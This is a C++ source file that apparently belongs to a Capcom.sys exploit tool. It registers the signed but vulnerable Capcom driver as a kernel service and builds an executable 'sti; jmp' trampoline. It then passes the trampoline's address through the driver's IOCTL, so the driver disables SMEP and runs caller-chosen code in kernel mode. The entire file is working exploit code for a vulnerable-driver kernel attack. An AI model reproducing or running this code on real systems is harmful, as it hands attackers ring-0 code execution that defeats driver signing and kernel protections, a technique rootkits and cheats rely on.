#include "stdafx.h"
#include "DriverLoader.h"
#include "Util.h"

/// Creates a service and loads Capcom.sys into the kernel.
/// When the driver is loaded, a device is exposed named '\\.\Htsysm72FB'
/// You can see this device in WinObj to ensure the module has loaded.
void DriverLoader::CreateServiceFromFile(const std::wstring& DriverPath)
{
	auto csDriverPath = DriverPath.c_str();
	if (!PathFileExists(csDriverPath))
	{
		Util::Exception::Throw("File not found: %S", csDriverPath);
	}

	SC_HANDLE hSCManager;
	SC_HANDLE hService;

	// Open Service Control Manager handle. We must create a service for the driver in order for the OS to load it.
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!hSCManager) Util::Exception::ThrowLastError(L"OpenSCManager");

	// Create the service.
	hService = CreateService(hSCManager, SERVICE_NAME, SERVICE_NAME, SERVICE_START | DELETE | SERVICE_STOP, \
		SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, csDriverPath, NULL, NULL, NULL, NULL, NULL);

	// If the service already exists on the system, simply use that service instead
	if (!hService)
	{
		hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_START | DELETE | SERVICE_STOP);
	}

	if (!hService) Util::Exception::ThrowLastError(L"OpenService");

	// Start the service. This just ensures that Capcom.sys module is loaded.
	StartServiceW(hService, 0, NULL);

	CloseServiceHandle(hService);

	CloseServiceHandle(hSCManager);
}

PPAYLOADTRAMP DriverLoader::AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc)
{
	// Allocate executable page for payload
	auto payload = reinterpret_cast<PTRAMPPAGE>(VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
	if (!payload) Util::Exception::ThrowLastError("VirtualAlloc");

	payload->TrampAddr = &payload->TrampData;

	// sti; jmp qword [PayloadAddr]
	payload->TrampData = {
		{0xFB, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00}, // sti; jmp qword [rip+7]
		targetFunc,
	};

	return &payload->TrampData;
}

void DriverLoader::ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc)
{
	// For passing to DeviceIoControl. The driver doesn't do anything with these.
	DWORD dummyOutBuf, dummyBytesReturned;

	// VirtualAlloc a trampoline payload
	PPAYLOADTRAMP payload = AllocPayloadTrampoline(targetFunc);

	// At this point, the service has started and the device should be loaded
	auto hCapcomDevice = CreateFile(CAPCOM_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hCapcomDevice == INVALID_HANDLE_VALUE) Util::Exception::ThrowLastError("CreateFile");

	// Trigger the payload by sending the address of the payload as InBuf. The driver will then disable SMEP and then execute our payload trampoline
	// which will jump to the function specified during the creation of the payload.
	auto bRes = DeviceIoControl(hCapcomDevice, CAPCOM_DEVICE_IOCTL64, reinterpret_cast<LPVOID>(&payload), 8, &dummyOutBuf, 4, &dummyBytesReturned, nullptr);
	if (!bRes) Util::Exception::ThrowLastError(L"DeviceIoControl");
}

